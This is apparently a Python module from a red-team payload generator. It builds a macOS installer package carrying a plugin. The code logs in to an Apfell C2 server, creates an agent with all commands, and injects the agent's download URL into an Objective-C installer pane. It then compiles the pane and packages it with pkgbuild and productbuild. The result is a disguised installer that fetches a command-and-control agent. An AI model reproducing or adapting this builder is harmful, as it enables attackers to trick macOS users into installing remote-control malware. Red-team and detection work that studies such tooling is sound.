import os
import asyncio
from .Utilities import *

def install_plug():
    temp = "./Templates/Installer_Plugins/"
    payload = "./Payloads/Installer_Plugins_Payload"    

    copyanything(temp,payload)    

    ## Create apfell payload
    async def scripting():
        payload_info = await login_and_create_apfell(description="Installer Pkg with Plugin",
                                                     filename="Installer_plugin.js",
                                                     include_all_commands=True)

        print("[*] Building Installer Package w/ Plugins Payload")
        url = await get_payload_download_url(payload_info)
    
        templateString = "apfellAddress"
        fin = open(payload + "/SpecialDelivery/MyInstallerPane.m", "rt")
        data = fin.read()
        data = data.replace(templateString, url) # modify to point to desired location
        fin.close()
        fin = open(payload + "/SpecialDelivery/MyInstallerPane.m", "wt")
        fin.write(data)
        fin.close()

        os.system("xcodebuild -project " + payload + "/SpecialDelivery.xcodeproj")
        os.mkdir(payload + "/plugins")
        copyanything(payload + "/build/Release/SpecialDelivery.bundle", payload + "/plugins/SpecialDelivery.bundle")
        shutil.copyfile(payload + "/SpecialDelivery/InstallerSections.plist", payload + "/plugins/InstallerSections.plist")

        os.system("pkgbuild --identifier com.simple --nopayload " + payload + "/plugins/simple.pkg")
        os.system("productbuild --identifier com.simple.agent --version 1 --package  " + payload + "/plugins/simple.pkg" + " --plugins " + payload + "/plugins/ " +  payload + "/componentpackage.pkg")

    async def main():
        await scripting()

    asyncio.run(main())
